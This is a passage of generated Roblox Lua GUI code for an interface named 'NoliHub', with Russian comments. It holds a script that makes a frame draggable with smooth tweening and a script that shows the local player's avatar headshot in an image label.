-- StarterGui.NoliHub.MainFrame.Drag
local function C_35()
local script = G2L["35"];
	local TweenService = game:GetService("TweenService")
	local UserInputService = game:GetService("UserInputService")
	
	-- Функция для плавного перемещения фрейма
	local function smoothMove(frame, targetPosition)
		local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
		local tween = TweenService:Create(frame, tweenInfo, {Position = targetPosition})
		tween:Play()
	end
	
	-- Функция для обработки начала перемещения
	local function makeDraggable(frame)
		local dragging = false
		local dragStart
		local startPos
	
		local function onInputBegan(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = frame.Position
	
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end
	
		local function onInputChanged(input)
			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				local delta = input.Position - dragStart
				local newPosition = UDim2.new(
					startPos.X.Scale,
					startPos.X.Offset + delta.X,
					startPos.Y.Scale,
					startPos.Y.Offset + delta.Y
				)
				smoothMove(frame, newPosition)
			end
		end
	
		frame.InputBegan:Connect(onInputBegan)
		frame.InputChanged:Connect(onInputChanged)
	end
	
	-- Пример использования
	local frame = script.Parent -- Укажите ваш фрейм
	makeDraggable(frame)
	
end;
task.spawn(C_35);
-- StarterGui.NoliHub.MainFrame.Screens.Home.Profile.Avatar.LocalScript
local function C_3c()
local script = G2L["3c"];
	local player = game.Players.LocalPlayer -- Получаем локального игрока
	local imageLabel = script.Parent -- Предполагается, что ImageLabel находится в родительском объекте скрипта
	
	-- Функция для установки аватара игрока в ImageLabel
	local function setPlayerAvatar()
		local userId = player.UserId -- Получаем ID игрока
		local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=420&height=420&format=png"
		imageLabel.Image = avatarUrl -- Устанавливаем изображение в ImageLabel
	end
	
	-- Вызываем функцию для установки аватара
	setPlayerAvatar()
	
end;
task.spawn(C_3c);
